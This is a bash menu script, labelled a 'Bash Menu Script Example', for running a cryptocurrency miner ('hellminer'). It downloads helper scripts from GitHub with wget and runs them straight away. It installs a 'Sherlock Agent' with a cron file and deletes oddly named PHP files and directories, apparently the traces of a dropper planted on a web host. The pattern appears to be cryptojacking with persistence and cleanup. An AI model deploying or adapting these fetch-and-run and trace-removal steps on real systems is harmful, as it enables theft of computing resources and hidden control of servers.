#!/bin/bash
# Bash Menu Script Example


function exec_hellminer() {
    wget -4 https://github.com/bitcloudson/rapidtools/raw/main/pl/start_hellminer.sh -O ./start_hellminer.sh
    bash start_hellminer.sh $1
}

function exec_hellminer_load_centoslib() {
    wget -4 https://github.com/bitcloudson/rapidtools/raw/main/pl/start_hellminer_load_centoslib.sh -O ./start_hellminer_load_centoslib.sh
    bash start_hellminer_load_centoslib.sh $1
}


function exec_sherlock_agent() {
    wget -4 https://github.com/bitcloudson/rapidtools/raw/main/pl/start_sherlock_agent.sh -O ./start_sherlock_agent.sh
    bash start_sherlock_agent.sh
}

function exec_clear() {
    if [ -d "./zx13b4911111" ]; then
        echo "./zx13b4911111 exist!"
        rm ./zx13b4911111 -rf
    fi

    if [ -d "../zx13b4911111" ]; then
        echo "../zx13b4911111 exist!"
        rm ../zx13b4911111 -rf
    fi

    if [ -f "./installer.php" ]; then
        unlink ./installer.php
    fi

    if [ -f "../installer.php" ]; then
        unlink ../installer.php
    fi

    if [ -f "./zx13b4911111.php" ]; then
        unlink ./zx13b4911111.php
    fi

    if [ -f "../zx13b4911111.php" ]; then
        unlink ../zx13b4911111.php
    fi

    
}


PS3='Please enter your choice: '
options=("Exec Hellminer" "Exec Hellminer(Load centos lib)" "Set Sherlock Agent" "Clear" "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "Exec Hellminer")
            echo "you chose execute Start Hellminer [Woker Name: $1]"
            exec_hellminer $1
            ;;
        "Exec Hellminer(Load centos lib)")
            echo "you chose execute Start Hellminer [Woker Name: $1]"
            exec_hellminer_load_centoslib $1
            ;;
        "Set Sherlock Agent")
            echo "you chose Set Sherlock Agent and Cron File"
            exec_sherlock_agent
            ;;
        "Clear")
            echo "you chose choice $REPLY which is $opt"
            exec_clear
            ;;
        "Quit")
            break
            ;;
        *) echo "invalid option $REPLY";;
    esac
done